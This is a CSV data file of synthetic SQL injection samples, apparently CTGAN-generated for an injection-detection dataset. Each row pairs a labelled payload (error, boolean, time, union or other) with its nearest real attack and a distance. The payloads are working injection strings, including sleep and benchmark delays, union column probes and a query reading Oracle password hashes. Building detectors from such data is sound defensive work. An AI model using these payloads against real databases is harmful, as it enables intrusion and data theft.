CTGAN_000149,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",nearest_attack_euclidean,R007062,3.1599829822935632
CTGAN_000150,attack,other,1'  )   where 1115  =  1115,nearest_attack_euclidean,R006621,3.3003142879017444
CTGAN_000151,attack,boolean,"1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R008240,3.7404376394390617
CTGAN_000152,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R002682,2.9062582990876398
CTGAN_000153,attack,union,"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",nearest_attack_euclidean,R006203,3.9802859234490513
CTGAN_000154,attack,other, (  case when 8422  =  8452 then 1 else null end  ) ,nearest_attack_euclidean,R006965,4.480480265727329
CTGAN_000155,attack,other,"make_set  (  6174  =  9734,1  )  ",nearest_attack_euclidean,R005136,2.7093895104119503
CTGAN_000156,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R005847,2.487592454101016
CTGAN_000157,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",nearest_attack_euclidean,R007411,4.872288667681997
CTGAN_000158,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zenl' like 'zenl",nearest_attack_euclidean,R001312,3.4837898311218516
CTGAN_000159,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003358,4.316462175808208
CTGAN_000160,attack,other," , drop table temp --",nearest_attack_euclidean,R000360,2.3132939598697453
CTGAN_000161,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000625,4.350490388953898
CTGAN_000162,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,24.254677878782807
CTGAN_000163,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,4.5601637201208165
CTGAN_000164,attack,error,"1'+  (  select zpns where 6922  =  6922 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R004011,28.68887798814126
CTGAN_000165,attack,boolean,"1 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R007518,2.3928024987141447
CTGAN_000166,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R003368,8.730862733590858
CTGAN_000167,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006418,3.0355587747596275
CTGAN_000168,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R002100,8.309414189710422
CTGAN_000169,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000803,5.4604607448156885
CTGAN_000170,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce",nearest_attack_euclidean,R001899,5.3883766620705345
CTGAN_000171,attack,error,1   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8023  =  8023,nearest_attack_euclidean,R004081,3.5713343265944975
CTGAN_000172,attack,other,"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",nearest_attack_euclidean,R008214,10.006613035657425
CTGAN_000173,attack,other,1  )   as hggi where 6511  =  6511,nearest_attack_euclidean,R002700,1.0511500616042064
CTGAN_000174,attack,boolean,"1'+  (  select 'gjaq' where 5449  =  5449 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R001603,3.9843257962709027
CTGAN_000175,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001841,4.195266259950114
CTGAN_000176,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000261,7.864952327961586
CTGAN_000177,attack,error,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",nearest_attack_euclidean,R004311,3.0655775324461376
CTGAN_000178,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,7.446139373566032
CTGAN_000179,attack,other, (  case when 6398  =  6398 then 1 else null end  ) ,nearest_attack_euclidean,R002089,2.3362998408437137
CTGAN_000180,attack,boolean,-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,nearest_attack_euclidean,R003424,3.459497513133061
CTGAN_000181,attack,other,"1""  )   as hsws where 6656  =  6656",nearest_attack_euclidean,R004999,2.2060719446957098
CTGAN_000182,attack,boolean,"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R007862,3.7632401574191916
CTGAN_000183,attack,boolean,"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca",nearest_attack_euclidean,R005565,3.220538585726178
CTGAN_000184,attack,boolean,"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003116,1.9677279411575548
CTGAN_000185,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.7959276450510475
CTGAN_000186,attack,error,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",nearest_attack_euclidean,R008260,2.5417413277492527
CTGAN_000187,attack,error,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""tepf""  =  ""tepf",nearest_attack_euclidean,R008371,3.16210459307339
CTGAN_000188,attack,error,"-2953""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""oaeh""  =  ""oaeh",nearest_attack_euclidean,R004617,6.268153210846312
CTGAN_000189,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000701,3.1376220880942727
CTGAN_000190,attack,error,"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",nearest_attack_euclidean,R006264,3.830946201460026
CTGAN_000191,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R007185,3.336764002462024
CTGAN_000192,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000867,1.9146571930635092
CTGAN_000193,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,3.4141739278618313
CTGAN_000194,attack,boolean,1'   )    )    and   (  1427  =  5813  )  *5813 and    (    (   'estb' like 'estb,nearest_attack_euclidean,R007207,3.1661894190435187
CTGAN_000195,attack,other,1'+  (  select zpdf where 2938  =  2938,nearest_attack_euclidean,R002869,1.924895779737783
CTGAN_000196,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R007287,1.638523074580307
CTGAN_000197,attack,boolean,"1'+  (  select tvpj where 7058  =  7058 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",nearest_attack_euclidean,R007683,3.9101904765511373
CTGAN_000198,attack,other,select   (  case when   (  3859  =  6938  )   then 3859 else 3859*  (  select 3859 from mysql.db  )   end  )  #,nearest_attack_euclidean,R006901,4.252070160850241
CTGAN_000199,attack,error,"1'   )    )    as xrre where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R005916,5.830999054508319
CTGAN_000200,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000868,2.907042822546781
CTGAN_000201,attack,error,"-7083"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ajcl"" like ""ajcl",nearest_attack_euclidean,R001351,4.722175787251578
CTGAN_000202,attack,boolean,-3088' or 6872  =  6872 and 'miwk'  =  'miwk,nearest_attack_euclidean,R001172,2.700899661897533
CTGAN_000203,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R005781,3.5044981584117925
CTGAN_000204,attack,union,"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R008656,3.15001145097295
CTGAN_000205,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R004432,3.3840310632239565
CTGAN_000206,attack,other,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',nearest_attack_euclidean,R004710,3.084392566368164
CTGAN_000207,attack,time,1'||  (  select 'sdll' where 5074  =  5074 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',nearest_attack_euclidean,R007401,6.446972760363303
CTGAN_000208,attack,error,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew",nearest_attack_euclidean,R002314,3.4434493162086697
CTGAN_000209,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R007095,3.927371761189383
CTGAN_000210,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R006548,5.472530086550911
CTGAN_000211,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000455,5.9712093255296494
CTGAN_000212,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R004324,2.5465505328629385
CTGAN_000213,attack,union,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",nearest_attack_euclidean,R005578,4.012215221201608
CTGAN_000214,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R002100,6.455772557235447
CTGAN_000215,attack,error,"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008298,4.176512361791039
CTGAN_000216,attack,error,"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R002313,4.612725221884469
CTGAN_000217,attack,boolean,"1%""  )   and elt  (  4249  =  4249,7259  )   and   (  ""%""  =  """,nearest_attack_euclidean,R007926,2.246387522284779
CTGAN_000218,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,1.0744578531774358
CTGAN_000219,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R006685,3.467670019945543
CTGAN_000220,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",nearest_attack_euclidean,R006243,6.715443725367634
CTGAN_000221,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",nearest_attack_euclidean,R001376,5.357278329022763
CTGAN_000222,attack,union,"1%'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000665,4.135824381702817
CTGAN_000223,attack,other, (  sqlvuln  ) ,nearest_attack_euclidean,R000627,1.3790392661974087
CTGAN_000224,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R002048,6.998762410805293
CTGAN_000225,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,4.210385915337211
CTGAN_000226,attack,other," union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",nearest_attack_euclidean,R000594,12.240308714782415
CTGAN_000227,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,nearest_attack_euclidean,R007761,2.7936430993067396
CTGAN_000228,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R001524,3.495814528675946
CTGAN_000229,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R001478,2.9383598723713438
CTGAN_000230,attack,boolean,1' in boolean mode  )   and 9198  =  9198--,nearest_attack_euclidean,R007127,2.8418407788971605
CTGAN_000231,attack,error,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",nearest_attack_euclidean,R002636,5.599855354753557
CTGAN_000232,attack,boolean,"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R005002,3.4763237968261036
CTGAN_000233,attack,error,1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,nearest_attack_euclidean,R007088,7.60320195063034
CTGAN_000234,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R002679,5.456286470262365
CTGAN_000235,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R001489,4.34158063888721
CTGAN_000236,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,1.8553490863301487
CTGAN_000237,attack,union,"1 where 1992  =  1992 union all select null,null--",nearest_attack_euclidean,R001943,3.7449311085665316
CTGAN_000238,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R002221,2.6672117615850235
CTGAN_000239,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,2.4191616493556154
CTGAN_000240,attack,other,"-2340%"" order by 1#",nearest_attack_euclidean,R007112,5.83140948100049
CTGAN_000241,attack,boolean,"1'  )   and elt  (  3528  =  3566,3566  )  ",nearest_attack_euclidean,R000949,2.4464930851102515
CTGAN_000242,attack,boolean,-8032%'   )    )     )   or 9323  =  9323#,nearest_attack_euclidean,R006107,3.0064140737620733
CTGAN_000243,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R005205,3.362944564056859
CTGAN_000244,attack,error,"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",nearest_attack_euclidean,R008072,4.421575395880483
CTGAN_000245,attack,error,"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",nearest_attack_euclidean,R003115,5.01399522462136
CTGAN_000246,attack,other,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',nearest_attack_euclidean,R004710,3.394340837217601
CTGAN_000247,attack,other,1 where 4985  =  4985 order by 1#,nearest_attack_euclidean,R008959,3.713592032942278
CTGAN_000248,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003923,3.5031132208145834
CTGAN_000249,attack,error,1'||  (  select 'rjis' from dual where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',nearest_attack_euclidean,R007765,3.040594684196646
CTGAN_000250,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007857,3.7221226478827925
CTGAN_000251,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",nearest_attack_euclidean,R005222,2.099916476666839
CTGAN_000252,attack,time,1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R006102,3.948016616939255
CTGAN_000253,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R001005,4.245317637995681
CTGAN_000254,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R003678,5.1233381417812565
CTGAN_000255,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R003691,3.5031731722976467
CTGAN_000256,attack,union,"-9507%"" union all select 3342,3342,3342,3342,3342#",nearest_attack_euclidean,R007582,4.337973718835585
CTGAN_000257,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R001060,4.771286815360403
CTGAN_000258,attack,other,select   (  case when   (  1082  =  6755  )   then 1082 else 1082*  (  select 1082 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008660,5.424413325647159
CTGAN_000259,attack,error,"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R004947,4.222818406281427
CTGAN_000260,attack,boolean,1'   )    )    and 7533  =  7533 and    (    (   'ialm'  =  'ialm,nearest_attack_euclidean,R008201,2.782629056863479
CTGAN_000261,attack,other,"1""   )    )    as ajwe where 1153  =  1153 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",nearest_attack_euclidean,R001922,8.243964837922373
CTGAN_000262,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,7.139665618990172
CTGAN_000263,attack,boolean,"1' in boolean mode  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006951,4.240443422608129
CTGAN_000264,attack,error,"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R007987,4.782269340396967
CTGAN_000265,attack,boolean,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000524,1.2952809078043424
CTGAN_000266,attack,error,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""tepf""  =  ""tepf",nearest_attack_euclidean,R008371,4.304056184836493
CTGAN_000267,attack,error,-1300  )   as rrsm where 1086  =  1086 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R003830,3.6743761178544196
CTGAN_000268,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R005984,3.6033804797319218
CTGAN_000269,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R007729,2.88428955267493
CTGAN_000270,attack,time,select sleep  (  5  )  #,nearest_attack_euclidean,R002315,4.324832951617791
CTGAN_000271,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R008160,3.434140344934615
CTGAN_000272,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R002028,3.1905320085859574
CTGAN_000273,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R005810,4.318748310202959
CTGAN_000274,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,5.964052928038305
CTGAN_000275,attack,boolean,"1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R004002,2.3196661172265447
CTGAN_000276,attack,boolean,1' where 9816  =  9816 and 7533  =  7533--,nearest_attack_euclidean,R004722,1.6424069182885284
CTGAN_000277,attack,union,"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",nearest_attack_euclidean,R002568,4.236138860205105
CTGAN_000278,attack,boolean,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh",nearest_attack_euclidean,R004490,1.585971835047295
CTGAN_000279,attack,other,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R007040,4.842209092924566
CTGAN_000280,attack,union,"-1755%' union all select 2615,2615,2615,2615,2615,2615#",nearest_attack_euclidean,R003098,5.677903511066827
CTGAN_000281,attack,union,"-9297  )   union all select 6841,6841,6841,6841,6841--",nearest_attack_euclidean,R006213,2.8696593962897605
CTGAN_000282,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn",nearest_attack_euclidean,R006143,2.891895930868766
CTGAN_000283,attack,union,"1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003523,5.132524867516509
CTGAN_000284,attack,time,1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R004559,5.971272098246884
CTGAN_000285,attack,other,"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R002435,3.8262635248439936
CTGAN_000286,attack,time,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R003512,4.729057729518576
CTGAN_000287,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000192,5.26530999280698
